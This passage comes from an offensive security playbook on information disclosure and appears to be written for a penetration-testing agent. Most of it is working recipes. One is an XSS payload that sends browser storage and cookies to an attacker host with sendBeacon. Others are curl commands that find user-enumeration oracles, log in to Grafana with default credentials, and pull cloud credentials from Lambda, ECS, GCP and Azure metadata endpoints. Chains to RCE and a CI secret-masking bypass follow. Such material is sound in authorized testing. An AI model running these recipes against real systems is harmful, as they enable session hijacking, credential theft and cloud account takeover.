**Preconditions.** All of: (i) the application stores sensitive data in browser-accessible storage (tokens in localStorage, user objects in IndexedDB, internal IDs in sessionStorage); (ii) the attacker can read the storage — via XSS (routes to `xss.md`), a shared/public terminal, a browser extension with storage access, or a diagnostic endpoint that dumps client state.

**Attack recipes.**

```javascript
// XSS payload — dump all client-side storage (exfil via beacon):
(function(){
  var d = {
    localStorage: JSON.parse(JSON.stringify(localStorage)),
    sessionStorage: JSON.parse(JSON.stringify(sessionStorage)),
    cookies: document.cookie
  };
  navigator.sendBeacon('https://attacker.tld/exfil', JSON.stringify(d));
})();

// IndexedDB enumeration (from XSS or DevTools):
indexedDB.databases().then(dbs => {
  dbs.forEach(db => {
    var req = indexedDB.open(db.name);
    req.onsuccess = function(e) {
      var tx = e.target.result;
      Array.from(tx.objectStoreNames).forEach(store => {
        tx.transaction(store).objectStore(store).getAll().onsuccess = function(ev) {
          console.log(db.name, store, ev.target.result);
        };
      });
    };
  });
});
```

```bash
# Enumerate what the application stores (from the page source/bundles):
# Grep recovered source maps or bundles for storage writes:
rg -n 'localStorage\.(set|get)Item|sessionStorage|indexedDB\.open|document\.cookie' ./src-out/

# Common high-value localStorage keys:
# auth_token, access_token, id_token, refresh_token, user, session,
# api_key, config, feature_flags, __clerk_*, __supabase_*
```

**Confirmation signal.** The storage contains token-shaped values (JWT patterns, `Bearer` tokens, API keys) or user objects with PII (email, name, internal ID, role). The application's source code confirms the storage write — the finding is the sensitive-data-in-client-storage pattern, not the XSS that reads it (the XSS finding is separate).

**Impact.** Token theft from client-side storage (session hijacking without cookie theft — many SPAs store JWTs in localStorage); PII disclosure from cached user objects; feature-flag leakage revealing internal rollout state; internal ID disclosure enabling IDOR attacks. Routes to `xss.md` for the XSS→storage-read chain and to `authentication_jwt.md` for the JWT-from-storage token-theft class.

## Error Message Differential and Stack-Trace Intelligence

**Primitive.** Application error responses carry intelligence that varies by framework, error type, and configuration: SQL errors reveal table/column names and DBMS version; template errors reveal template paths and variable names; authentication errors reveal user-enumeration oracles ("invalid password" vs "user not found"); validation errors reveal internal field names and type constraints. The differential — comparing error shapes across inputs, endpoints, and authentication states — extracts a richer signal than any single error.

**Preconditions.** All of: (i) the application returns different error responses for different failure modes (nearly universal — the question is how much detail); (ii) the error responses are not normalized to a single generic shape (many frameworks return detailed errors in dev mode; some leak details in production through misconfiguration or incomplete error-handling).

**Attack recipes.**

```bash
# SQL error extraction — send type-mismatched inputs to trigger DBMS-specific errors:
curl -s 'https://target/api/user?id=1%27' | grep -iE 'sql|syntax|mysql|postgres|oracle|sqlite|mssql'
# MySQL: "You have an error in your SQL syntax near '1'' at line 1"
# PostgreSQL: "ERROR: unterminated quoted string at or near \"'1'\""
# MSSQL: "Unclosed quotation mark after the character string '1'."

# Stack-trace path extraction:
curl -s 'https://target/api/nonexistent' | grep -oE '/[a-zA-Z0-9/_.-]+\.(py|rb|java|cs|php|js|ts):[0-9]+'
# Extracts absolute file paths + line numbers from stack traces

# User-enumeration oracle via error differential:
# Login with known-valid email + wrong password:
curl -s -X POST 'https://target/login' -d 'email=admin@target.com&password=wrong' | md5sum
# Login with invalid email:
curl -s -X POST 'https://target/login' -d 'email=noone@target.com&password=wrong' | md5sum
# Different hashes → the error message or response differs → user-enumeration oracle

# Registration oracle:
curl -s -X POST 'https://target/register' -d 'email=admin@target.com'
# "Email already registered" vs "Registration failed" → enumeration

# Validation error schema extraction — send invalid types to each field:
curl -s -X POST 'https://target/api/user' \
  -H 'Content-Type: application/json' \
  -d '{"role": 123, "admin": "yes", "internal_id": null}' | jq '.errors'
# Validation errors name internal fields ("role must be one of: user, admin, superadmin")
# and reveal type constraints ("internal_id must be a UUID")

# Framework fingerprint from error response:
curl -s 'https://target/does-not-exist' -o /dev/null -D - | grep -iE 'x-powered|server:|x-aspnet'
# 404 page structure also fingerprints: Django's yellow debug page, Rails' routing error,
# Spring Boot's /error JSON, Express's "Cannot GET" text, ASP.NET's custom error XML
```

**Confirmation signal.** The error response contains at least one of: DBMS-specific SQL error syntax, absolute filesystem paths with line numbers, internal field/model names, or a differential between two error conditions that reveals existence/state (user-enumeration, record-enumeration). The intelligence is actionable — it feeds directly into the next exploitation step.

**Impact.** SQL error intelligence drives `sql_injection.md` (table/column names shortcut blind extraction); stack-trace paths feed `path_traversal_lfi_rfi.md`; user-enumeration oracles enable credential-stuffing attacks (routes to `weak_password_detection.md`); validation errors reveal the internal data model for mass-assignment attacks (routes to `mass_assignment.md`). The error differential is the cheapest reconnaissance — it requires no tooling beyond `curl` and `diff`.

## Observability Stack Exploitation: Prometheus, Grafana, Jaeger, Alertmanager

**Primitive.** Observability tools deployed alongside production applications — Prometheus for metrics, Grafana for dashboards, Jaeger/Zipkin for distributed traces, Alertmanager for alert routing — expose rich internal state when reachable without authentication. Each tool has a distinct disclosure surface: Prometheus `/metrics` and its API enumerate internal hostnames, service topology, and process arguments; Grafana's data-source proxy can SSRF into internal services; Jaeger traces contain request payloads with PII, tokens, and internal service call graphs; Alertmanager reveals alert rules, notification channels (with webhook URLs and Slack tokens), and silence rules that indicate known vulnerabilities being suppressed.

**Preconditions.** All of: (i) the observability tool is reachable from the attacker's network (commonly exposed on separate ports: Prometheus on `:9090`, Grafana on `:3000`, Jaeger on `:16686`, Alertmanager on `:9093`); (ii) the tool's authentication is disabled or set to its insecure default (Prometheus ships with no auth; Grafana defaults to `admin:admin`; Jaeger has no built-in auth); (iii) the tool scrapes or receives data from production services (versus a staging-only deployment).

**Attack recipes.**

```bash
# Prometheus — enumerate metrics and targets:
curl -s 'http://target:9090/api/v1/targets' | jq '.data.activeTargets[] | {job: .labels.job, instance: .labels.instance, health}'
# Returns every scrape target — internal hostnames, ports, service names.

curl -s 'http://target:9090/api/v1/label/__name__/values' | jq '.data[]' | head -50
# Returns every metric name — reveals internal service names and business metrics.

# Process-argument disclosure (if process_exporter or node_exporter process metrics are enabled):
curl -s 'http://target:9090/api/v1/query?query=process_cmdline' | jq '.data.result[].metric'
# Returns command-line arguments of scraped processes — may include DB passwords,
# API keys passed as CLI args, and internal service URLs.

# Grafana — test default credentials:
curl -s -u admin:admin 'http://target:3000/api/org' | jq '.name'
# If 200 + org name → default creds active.

# Grafana — enumerate data sources (auth required, default creds often work):
curl -s -u admin:admin 'http://target:3000/api/datasources' | \
  jq '.[] | {name, type, url, database, user}'
# Returns internal data-source URLs (Elasticsearch, InfluxDB, PostgreSQL) with
# connection strings — the URL and database fields are intelligence.

# Grafana — data-source proxy SSRF (CVE-2021-43798 is file-read, but the proxy is SSRF):
curl -s -u admin:admin 'http://target:3000/api/datasources/proxy/1/internal-service/api/health'
# The data-source proxy forwards requests from Grafana to the configured backend.
# An attacker who controls the path component can reach internal services via the proxy.

# Jaeger — enumerate services and traces:
curl -s 'http://target:16686/api/services' | jq '.data[]'
# Returns every service name in the trace store.

curl -s 'http://target:16686/api/traces?service=payment-service&limit=20' | \
  jq '.data[].spans[] | {operationName, tags: [.tags[] | select(.key | test("http|db|user|token|auth"; "i"))]}'
# Trace spans contain HTTP request/response details: URLs, headers (including
# Authorization tokens), query parameters, database queries, and user IDs.
# The 'tags' and 'logs' fields on spans are the primary disclosure surface.

# Alertmanager — enumerate alerting rules and silences:
curl -s 'http://target:9093/api/v2/alerts' | jq '.[].labels'
# Active alerts name the failing service and the condition.

curl -s 'http://target:9093/api/v2/silences' | jq '.[] | {matchers, comment, createdBy}'
# Silences often carry comments like "suppressing until we patch CVE-XXXX"
# or "known issue in <service>, fix ETA <date>" — vulnerability intelligence.

curl -s 'http://target:9093/api/v2/receivers' | jq '.[].name'
# Receiver names suggest notification channels (Slack, PagerDuty, email).
```

**Confirmation signal.** Prometheus returns `200` with a JSON result containing target labels with internal hostnames; Grafana accepts `admin:admin` or returns data-source configurations; Jaeger returns service names and spans with application-level tags; Alertmanager returns active alerts or silences with internal comments. Any of these is a confirmed info-disc finding.

**Impact.** Prometheus target disclosure maps the internal service topology for lateral movement scoping; Grafana data-source configurations leak internal database URLs and credentials; Jaeger traces contain production request payloads including auth tokens and PII; Alertmanager silences reveal known-but-unpatched vulnerabilities. The Grafana data-source proxy is an SSRF primitive (routes to `ssrf.md`); for the file-read CVE-2021-43798 chain and the full Grafana/Prometheus exploitation depth, load `grafana_prometheus` (canonical owner of that pivot chain).

## Serverless and Container Runtime Metadata Leakage

**Primitive.** Serverless platforms (AWS Lambda, Azure Functions, Google Cloud Functions, Cloud Run) and container orchestrators (ECS, Fargate, Cloud Run) inject runtime metadata into the function/container environment: environment variables with IAM credentials, task metadata endpoints with container identity, and platform-specific configuration that reveals the deployment's architecture. Unlike EC2 IMDS (covered in the Cloud IMDS section), these metadata surfaces are function-local and carry different credential types (Lambda execution role tokens, ECS task role credentials, Cloud Run identity tokens).

**Preconditions.** All of: (i) the attacker has code execution or environment-variable read in the serverless function or container (via RCE, SSRF with environment-variable read, or a debug endpoint); (ii) the runtime injects credentials into the environment (default behavior on all major platforms); (iii) the injected credentials carry non-trivial permissions.

**Attack recipes.**

```bash
# AWS Lambda — environment variables contain the execution role's credentials:
env | grep -E 'AWS_ACCESS_KEY|AWS_SECRET|AWS_SESSION_TOKEN|AWS_LAMBDA|_HANDLER'
# AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN are the Lambda
# execution role's temporary STS credentials. _HANDLER reveals the function
# entry point; AWS_LAMBDA_FUNCTION_NAME reveals the function name.

# Lambda runtime API (localhost:9001 inside the Lambda runtime):
curl -s "http://localhost:9001/2018-06-01/runtime/invocation/next"
# The runtime API is intended for custom runtimes; an attacker with code
# execution can intercept the next invocation event payload.

# ECS Task Metadata Endpoint v4 (injected via ECS_CONTAINER_METADATA_URI_V4):
curl -s "$ECS_CONTAINER_METADATA_URI_V4"
# Returns container metadata: image, labels, networks, volumes.

curl -s "$ECS_CONTAINER_METADATA_URI_V4/task"
# Returns task-level metadata: task ARN, cluster, all containers in the task.

# ECS Task Role credentials (separate from the instance profile):
curl -s "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI"
# Returns the task role's STS credentials — AccessKeyId, SecretAccessKey, Token.
# This endpoint is distinct from the EC2 IMDS; it is ECS-specific and uses
# the relative URI injected as an environment variable.

# Google Cloud Functions / Cloud Run — identity token:
curl -s -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
# Returns the function's service-account OAuth2 token.
# Cloud Run also exposes K_SERVICE, K_REVISION, K_CONFIGURATION env vars.

# Azure Functions — managed identity token:
curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
  "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01"
# Returns the function's managed-identity access token.
# MSI_ENDPOINT and MSI_SECRET (legacy) or IDENTITY_ENDPOINT and IDENTITY_HEADER
# are injected into the function's environment.

# Environment-variable enumeration (all platforms):
env | sort | grep -iE 'key|secret|token|password|credential|endpoint|database|connection'
# Serverless environments are especially dense with injected secrets because
# there is no filesystem for config files — everything comes via env vars.
```

**Confirmation signal.** The environment contains `AWS_ACCESS_KEY_ID` + `AWS_SECRET_ACCESS_KEY` + `AWS_SESSION_TOKEN` (Lambda/ECS), or the metadata endpoint returns an OAuth2/STS credential JSON, or the environment variables include platform-specific identifiers (`AWS_LAMBDA_FUNCTION_NAME`, `K_SERVICE`, `WEBSITE_SITE_NAME`) confirming the runtime platform and exposing the function identity.

**Impact.** Serverless credential disclosure carries the function's execution role or managed identity, which typically has access to the function's dependent resources (DynamoDB, S3, Cosmos DB, Cloud Storage, Pub/Sub). ECS task role credentials are often more permissive than Lambda roles because ECS tasks run longer-lived services with broader IAM needs. Environment-variable enumeration in serverless is especially high-yield because the no-filesystem constraint means database passwords, API keys, and third-party service tokens are all in the environment. Routes to `cloud/*` for per-provider post-exploitation with the recovered credentials; routes to `ssrf.md` for the SSRF mechanism that reaches these metadata endpoints from the outside.

## Cross-Channel Disclosure Asymmetry

**Primitive.** Modern applications expose the same backend data through multiple channels — REST, GraphQL, WebSocket, gRPC, mobile SDK endpoints, and background-job APIs. Each channel often enforces its own authorization and field-filtering logic, and the enforcement is rarely consistent. A field hidden by the REST serializer may be returned by the GraphQL schema; a mutation forbidden on WebSocket may be reachable via gRPC server reflection; the SSR hydration state may ship fields the client-side JSON API would withhold.

**Preconditions.** All of: (i) the application exposes at least two channels into the same data model; (ii) the channels use different code paths for authorization or serialization (common when the GraphQL layer bolted onto a REST backend uses the REST layer's models directly without the REST serializer's field filter).

**Attack recipe.**

```bash
# Enumerate GraphQL schema if introspection is enabled:
curl -X POST 'https://target/graphql' -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name,fields{name,type{name}}}}}"}'

# Compare REST and GraphQL field exposure for the same object:
curl 'https://target/api/user/me' | jq keys                              # REST fields
curl -X POST 'https://target/graphql' -d '{"query":"{me{...on User{...}}}"}' | jq .data.me
# GraphQL often returns additional fields the REST serializer withholds (internal IDs,
# audit timestamps, soft-delete flags, admin notes).

# gRPC server reflection (if enabled):
grpcurl -plaintext target:443 list                                       # service inventory
grpcurl -plaintext target:443 describe <service>                         # method + message definitions
# gRPC often exposes internal services (telemetry, admin) not fronted by HTTP.

# WebSocket inventory + schema:
wscat -c wss://target/ws -H 'Cookie: session=<cookie>'
# > {"type":"subscribe","channel":"inventory"}
# Many apps implement push notifications over WebSocket with lax authorization —
# a subscribe to a channel pattern can leak messages intended for other users.
```

**Confirmation signal.** The channels disagree on at least one field, authorization decision, or data item for the same semantic resource. Specifically: the GraphQL schema includes a field the REST serializer omits; the gRPC method signature exposes a method the REST API does not route; the WebSocket channel pattern accepts a subscription that filters by resource ID without authorization.

**Impact.** Field disclosure across channels (REST hides, GraphQL returns); unauthorized method invocation (REST gates, gRPC accepts); real-time data leakage (WebSocket subscribes without filtering by caller identity). Routes to `idor.md` for the resource-ID exposure, to `broken_function_level_authorization.md` for the method-invocation gap, and to `api.md` (if the deployment has it) for channel-specific exploitation.

## File-Metadata Extraction

**Primitive.** Uploaded images, documents, PDFs, and office files carry embedded metadata — EXIF for images (camera, GPS, timestamps, software, serial numbers), XMP/IPTC for professional media, PDF document properties (author, software, embedded objects, revision history), Office document properties (author, saved-by, last-printed, embedded objects). Served without stripping, this metadata often leaks internal information: author's email, internal filesystem paths from the saving-tool's working directory, GPS coordinates of employee homes, software versions of internal tooling.

**Preconditions.** All of: (i) the application serves user-uploaded files without a metadata-stripping pass; (ii) the uploaded files have been processed on internal workstations before upload (so they carry employee-authored metadata); (iii) specific fields contain intelligence (not every image is pre-sanitized).

**Attack recipe.**

```bash
# Bulk-extract metadata from served uploads:
mkdir -p harvested-metadata
for url in $(cat upload-urls.txt); do
  f=$(basename "$url")
  curl -s "$url" -o "/tmp/$f"
  exiftool -json "/tmp/$f" >> harvested-metadata/exif-$(date +%s).json
done

# Pickaxe metadata for intelligence:
jq -r '.[0] | .Creator, .Author, .GPSLatitude, .GPSLongitude, .SourceFile' harvested-metadata/*.json
# PDF revision history: pdfinfo and pdftotext -nopgbrk reveal "last modified by" + saved-by
pdfinfo /tmp/doc.pdf | grep -iE 'author|producer|creator'
pdfid.py /tmp/doc.pdf                                     # embedded JS, EmbeddedFile, Launch actions
```

**Confirmation signal.** The extracted metadata contains at least one of: an author email on an internal domain, GPS coordinates near a known office location, a `Software` tag naming internal tooling, a filesystem path from a user's workstation (e.g. `C:\Users\<name>\Documents\...`). The data is reproducibly extractable from the served file, which the deployment did not strip.

**Impact.** Phishing-target enumeration (author emails + GPS → social engineering), internal-path enumeration (filesystem paths reveal naming conventions and internal tooling versions), embedded-object exploitation (PDFs with Launch actions or embedded files that extract to disk-equivalent paths). Routes to `reconnaissance/*` for the enumeration pipelines and to `insecure_file_uploads_advanced_deep.md § Processing Race` where the metadata extractor itself is reachable.

## CORS and Referrer-Policy Primitives

**Canonical owner for CORS mechanism**: `cors_misconfiguration` and `cors_misconfiguration_advanced_deep` own the CORS misconfiguration class (origin reflection, Fetch-standard three-condition confirmation rule, allowlist-bypass depth, framework-middleware CVE catalog). The 2024–2026 verified CVE instances (Flask-CORS × 3, Fiber v2, Hono, elysia-cors) with version metadata are at `cors_misconfiguration_novel_deep.md`.

**Information-disclosure-side residual**. The disclosure framing of CORS misconfiguration is specifically: an authenticated API's response body is readable from attacker-origin JS without the attacker needing to subdomain-takeover a trusted origin or chain through CSRF — the gap is discoverable from the API's response headers alone. Audit discipline: run a baseline `curl` probe with an attacker Origin against each authenticated endpoint; apply the three-condition confirmation rule (echo + ACAC:true + authenticated content) at `cors_misconfiguration.md § Confirmation and Validation Discipline`.

**Referrer-Policy Primitives** (not CORS-related; information-disclosure specific). Weak referrer policy leaks URL paths, query strings, and sometimes bearer tokens to third-party resources the page loads (external fonts, analytics beacons, embedded images).

**Preconditions**: (i) the page sets `Referrer-Policy` to `unsafe-url`, `no-referrer-when-downgrade`, or leaves it default (which varies by browser but often leaks path+query cross-origin); (ii) the page embeds a cross-origin resource that will receive the `Referer` header on load.

**Attack recipe**:
```bash
# Referrer policy audit — pages that leak Referer
curl -I 'https://target/account/reset-password?token=abc' | grep -i 'Referrer-Policy'
# If the policy is permissive and the page embeds a third-party resource (CDN image,
# Google Fonts, analytics beacon), the Referer header includes the full URL — the
# reset-password token leaks to the third party's logs.

# Analytics-pixel leak probe
curl -s 'https://target/account/reset-password?token=abc' | \
  grep -oE 'https?://[^"]+(google-analytics|googletagmanager|segment|mixpanel|hotjar)[^"]*'
# Any external beacon on a page carrying tokens in the URL is a referrer-leak source.
```

**Confirmation signal**: a page with sensitive query data embeds a cross-origin resource that the browser loads with a `Referer:` header containing the sensitive data.

**Impact**: Token leak to third-party log pipelines via referrer. The CORS half of the disclosure (if present) routes to `cors_misconfiguration` for the mechanism and confirmation discipline; the state-change-upgrade framing where CORS-relaxed produces CSRF read-back routes to `csrf_advanced_deep.md § CORS-Relaxed CSRF`; the subdomain-takeover delivery channel for CORS trust escalation routes to `subdomain_takeover_advanced_deep.md § CORS Trust Escalation`.

## Chaining Surface

**Upstream primitives:** `reconnaissance/*` surfaces the endpoint inventory that drives this file's detection; `broken_function_level_authorization.md` grants access to admin-reachable debug/profile endpoints; `idor.md` grants access to disclosed records via enumerated IDs; `ssrf.md` provides the request path that reaches IMDS, Kubernetes API, and container metadata endpoints; `rce.md` provides code-execution positions from which environment variables, mounted secrets, and metadata endpoints are directly readable; `xss.md` provides the browser-side read that exfiltrates client-side storage.

**Downstream capabilities (expanded):**

**Downstream capabilities:**


- `rce.md` — framework-debug endpoints (Werkzeug, Ignition) and actuator-gateway (CVE-2022-22947) reach direct code execution.
- `ssrf.md` — Grafana datasource proxy, Jolokia-reachable MBeans, and the Kyverno `http.Lib` class drive SSRF; the information-disclosure angle is the class abstraction (RBAC-via-network-call bypass).
- `path_traversal_lfi_rfi.md` — paths disclosed in stack traces and `/pprof/cmdline` map the filesystem for subsequent traversal.
- `insecure_deserialization.md` — the `/actuator/jolokia` MBean-loading chain and the Spring Cloud Gateway SpEL chain both reach deser sinks via the same disclosed-and-reachable actuator.
- `authentication_jwt.md` — heap dumps and source maps leak signing keys / HMAC secrets.
- `idor.md` — hydration-blob and GraphQL field-exposure gaps disclose per-resource IDs for enumeration.

**Composite chains (routed by filename):**

1. **Source-map leak → recovered sources name sink → direct exploit.** Discover `.map` alongside bundle; `unwebpack-sourcemap` reconstructs; `rg` finds a `req.params.id` without an authorization check and the matching API endpoint; direct hit against the API with enumerated IDs. Routes to `idor.md`.

2. **`/actuator/heapdump` → MachineKey / JWT signing key → forge tokens → ATO.** Download heap; `strings` + grep extracts the JWT HMAC secret or the ASP.NET MachineKey; forge an authenticated token with elevated claims; present to the application and gain the forged identity's privilege. Routes to `authentication_jwt.md § HMAC Secret Recovery` and `insecure_deserialization.md § ASP.NET ViewState Forgery`.

3. **`.git/` dump → removed credentials in history → cloud control plane.** `git-dumper`; pickaxe for `AKIA`; test keys against `aws sts get-caller-identity`; the still-active key grants cloud-plane access. Routes to `cloud/*` for the per-provider post-exploitation.

4. **Spring Cloud Gateway `/actuator/gateway/routes` → SpEL route → RCE.** POST a route whose filter carries a SpEL expression; refresh; hit the route to execute. See `information_disclosure_novel_deep.md § Spring Cloud Gateway Actuator SpEL` for the version boundary; routes to `rce.md`.

5. **Kyverno `http.Lib()` SSRF → IMDS → cloud IAM → cluster-wide pivot.** Namespace-scoped `NamespacedValidatingPolicy` with `http.Get('http://169.254.169.254/latest/meta-data/iam/security-credentials/')` executes from the Kyverno pod identity; the response carries temporary cloud credentials; the credentials carry cluster-wide read/write via the Kyverno controller's cloud role. The *info-disc* finding is the RBAC-bypass class; the *SSRF mechanism* routes to `ssrf.md § Cloud IMDS Exfiltration`; the *post-exfil IAM-abuse* routes to `cloud/*`.

6. **K8s over-privileged SA → cross-namespace secret enumeration → cloud credential pivot.** Pod service-account token with `list secrets` at cluster scope → enumerate all namespaces' secrets → extract cloud IAM keys stored as Kubernetes secrets → `aws sts get-caller-identity` confirms the key is live → cloud-plane access with the secret's attached policy. Routes to `broken_function_level_authorization.md` for the RBAC scope and to `cloud/*` for the cloud pivot.

7. **CI/CD masking bypass → exfiltrated credential → production access.** Fork-triggered PR CI workflow with `echo "${{ secrets.DEPLOY_KEY }}" | base64` → unmasked base64 in build log → decode → SSH key for production deployment target → production shell. Routes to `supply_chain_ci_integrity.md` for the fork-PR attack surface and to `rce.md` for the post-credential execution.

8. **GraphQL introspection → hidden mutation → admin takeover.** Full introspection reveals `setUserRole(userId: ID!, role: String!)` mutation not exposed in the UI → direct mutation call with the attacker's user ID and `role: "admin"` → privilege escalation without any authorization check on the mutation. Routes to `broken_function_level_authorization.md` for the hidden-endpoint access and to `idor.md` for the user-ID enumeration.

## Detection and Confirmation Methodology

- **Artifact-first discovery.** DVCS, backups, source maps, hydration blobs, actuators, and metadata catalogs yield the fastest wins. The reconnaissance pipeline should enumerate these before firing payloads at the application.
- **Diff harness across identities.** Every disclosed-information finding should be reproducible across (owner / non-owner / anonymous) × (channel). The oracle bits (status, length, ETag, Last-Modified, timing) are the detection surface; the body content is the confirmation.
- **Per-stack fingerprint for debug endpoints.** The `/actuator`, `/debug/pprof`, `/_profiler`, `/elmah.axd`, `/_ignition/*`, Werkzeug `/console`, Django DEBUG error page — each has a stack-specific response signature. Fingerprint the stack first, then probe the matching endpoints.
- **Hydration-blob diff.** Capture SSR hydration blobs across roles; a field present in a role's blob but not in its DOM, and absent from the API's documented response for that role, is a disclosure.
- **Observability discovery.** Enumerate `/metrics`, `/actuator`, `/debug/pprof`, `/jolokia`, `/healthz`, `/readyz`, `/ready`, `/prom` paths; map each to the owning stack; identify the privilege scope each one carries. Probe adjacent observability ports (`:9090` Prometheus, `:3000` Grafana, `:16686` Jaeger, `:9093` Alertmanager) from the same network segment; these are frequently exposed with no authentication.
- **Cloud/container metadata probes.** From any code-execution position: probe `169.254.169.254` (IMDS), `169.254.170.2` (ECS task metadata), and the environment for `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`, `ECS_CONTAINER_METADATA_URI_V4`, `K_SERVICE` (Cloud Run), or `IDENTITY_ENDPOINT` (Azure Functions). In Kubernetes: check `/var/run/secrets/kubernetes.io/serviceaccount/token` existence and test `SelfSubjectRulesReview` to map the pod's RBAC scope.
- **CI/CD log and artifact audit.** For public repositories: review GitHub Actions workflow runs for unmasked secrets (search for base64-encoded values, `AKIA`, `ghp_`, `glpat-`). For private: check Jenkins anonymous-read permissions on `/job/<name>/lastBuild/consoleText`. Audit artifact stores for environment dumps or config files that should not have been retained.
- **GraphQL schema extraction.** Attempt full introspection first; if disabled, probe field suggestions via deliberately-misspelled field names. Check for exposed Altair/GraphiQL IDEs at common paths. Compare the schema's type surface against the UI's visible fields — any type with fields like `passwordHash`, `internalId`, `adminNotes` is a finding.
- **Client-side storage audit.** From browser DevTools or an XSS position: enumerate `localStorage`, `sessionStorage`, `IndexedDB` databases, and non-`HttpOnly` cookies for token-shaped values. Grep the application's source bundles for `localStorage.setItem` / `sessionStorage.setItem` calls to identify what the application intentionally stores client-side.
- **Error-differential mapping.** For each endpoint: send type-mismatched inputs, boundary values, and missing required fields. Compare the error response structure across (valid user / invalid user / no auth) — any field that appears only in one authentication state is a differential oracle. Capture the paired responses.

## False-Positive Discipline

- **Version banners without a reachable exploit are informational, not findings.** `X-Powered-By: PHP/5.6.40` is a fact; it is a finding only if there is a reachable exploit in that PHP version in the deployment. Per the base's triage rubric, downgrading to informational is correct.
- **Public content disclosure is not an info-disc finding.** The site's homepage URL, OpenGraph metadata, and advertised API endpoints are not disclosures; report only when the disclosed content was intended to be private.
- **Internal hostnames in responses are not disclosures without a chain.** `X-Forwarded-For: 10.0.1.42` reveals an internal IP; this is a finding only if the IP is reachable from the attacker's position or if the enumeration enables another chain. Per the base's rubric, "paths and hostnames suggest a possible second vulnerability" is informational unless the chain is validated.
- **Hydration-blob fields that are also in the DOM are not disclosures.** The blob being larger than the DOM is noise; the finding requires a field in the blob that the DOM does not render AND that would be access-controlled through the API.
- **CORS `Access-Control-Allow-Origin: *` without `Allow-Credentials: true` is not credentialed-fetch disclosure.** The browser does not send cookies on the fetch; the response is public-only. Report only when `Allow-Credentials: true` is also present (which is the specification-violating combination).
- **Kyverno CVE-2026-4789's info-disc angle is the RBAC class abstraction, not the full SSRF primitive.** The mechanism is owned by `ssrf.md`; this file names the class abstraction. Do not duplicate the SSRF content here.
- **Prometheus `/metrics` without sensitive labels is informational.** Standard Go/JVM runtime metrics (`go_goroutines`, `jvm_memory_bytes_used`) are not a finding. The finding requires at least one of: internal hostnames in target labels, process command-line arguments containing credentials, or business-logic metrics that reveal user activity.
- **Grafana with authentication enforced and non-default credentials is not a finding.** The existence of a Grafana instance is not a disclosure; the finding requires either default credentials accepted, anonymous access enabled, or a data-source proxy SSRF demonstrated.
- **Kubernetes `SelfSubjectRulesReview` showing only default permissions is not a finding.** A pod with `system:serviceaccount:default:default` and only `get` on its own namespace's pods is not over-privileged. The finding requires RBAC grants beyond the pod's operational needs — `list secrets`, cross-namespace access, or cluster-scope permissions.
- **CI/CD logs with properly masked secrets are not a finding.** GitHub Actions masking a secret in the log is the correct behavior. The finding requires a masking bypass (base64 encoding, character splitting, artifact exfiltration) that recovers the secret despite the masking.
- **GraphQL introspection on a public API with no hidden fields is not a finding.** Some APIs intentionally expose their full schema (documentation-first design). The finding requires fields in the schema that the UI does not expose AND that contain sensitive data or privileged operations.
- **Serverless environment variables that contain only platform identifiers (function name, region, runtime version) are informational.** The finding requires credential-type values (access keys, tokens, connection strings) in the environment, not platform metadata.

## Validation

- Capture the exact HTTP request+response that produced the disclosure, including identity headers (`Cookie`, `Authorization`) and the full response body.
- For diff-oracle findings, capture the paired responses (owner and non-owner) and the specific field that differs; include both response bodies in the finding.
- For reconstruction findings (DVCS, source maps), preserve the recovered artifact and a specific extracted secret / endpoint / internal path as the "what was reconstructed" evidence.
- For hydration-blob findings, preserve the HTML containing the blob, the parsed-JSON view, and the specific field that was disclosed cross-role or beyond-DOM.
- For actuator / observability findings, preserve the response from each probed endpoint and the specific intelligence pulled (strings-matched heap excerpt, extracted MBean name, extracted config property name).
- For cloud/container metadata findings, preserve the IMDS or task-metadata response JSON, the environment-variable dump (redacted to credential prefixes — `AKIA...`, first 8 chars of secret), and the `SelfSubjectRulesReview` response showing the pod's RBAC permissions.
- For CI/CD findings, preserve the build log excerpt containing the unmasked secret (with the secret value partially redacted), the artifact download URL, and the workflow file that triggered the leak.
- For GraphQL findings, preserve the introspection response (or field-suggestion error) and highlight the specific fields or mutations not exposed through the UI.
- For client-side storage findings, preserve the storage key/value pairs containing tokens or PII, the source-code location of the `setItem` call, and the storage mechanism (localStorage, sessionStorage, IndexedDB, cookie).
- For serverless/container runtime findings, preserve the environment-variable names and credential types (with values partially redacted), the metadata endpoint responses, and the platform-specific identifiers confirming the runtime.

## Summary

Advanced info-disclosure is reconstruction, diff, and class abstraction: reconstruction of artifacts (DVCS, maps, heaps) yields the fastest exploit paths; diff across identities and channels (owner/non-owner, REST/GraphQL/WS/gRPC, hydration-vs-DOM) reveals asymmetries the application did not equalize; and class abstraction (CORS-reflected-with-credentials, Werkzeug-PIN-crackability, cluster-controller-pod-identity-RBAC-bypass, CI/CD-masking-bypass, serverless-env-credential-injection) names the pattern that generalizes beyond the specific stack. The attack surface spans cloud metadata (IMDS, ECS task metadata, serverless runtime), container orchestration (K8s secrets, ConfigMaps, RBAC scope), CI/CD pipelines (build logs, artifacts, masking bypasses), API schemas (GraphQL introspection, field suggestions), client-side storage, error differentials, and observability stacks (Prometheus targets, Grafana data sources, Jaeger traces, Alertmanager silences). CVE-level findings are instances of these patterns; the version-boundary metadata and specific primitives live in the novel sibling, with chain routing by filename to the sibling that owns each downstream capability — RCE, SSRF, auth-token forgery, deserialization, IDOR.
